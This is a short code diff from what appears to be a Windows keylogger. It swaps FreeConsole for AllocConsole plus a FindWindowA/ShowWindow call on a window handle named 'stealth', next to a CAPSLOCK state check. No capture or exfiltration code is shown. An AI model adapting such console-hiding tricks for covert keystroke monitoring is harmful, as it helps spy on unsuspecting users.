@@ -58,7 +58,15 @@ bool IsCapsLockUp;
 
 int main() {
 	// Detach program from its console
-	FreeConsole();
+	
+    HWND stealth;
+
+    AllocConsole();
+
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+
+    ShowWindow(stealth, 1);
+
 
 	// Check CAPSLOCK state
 	if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
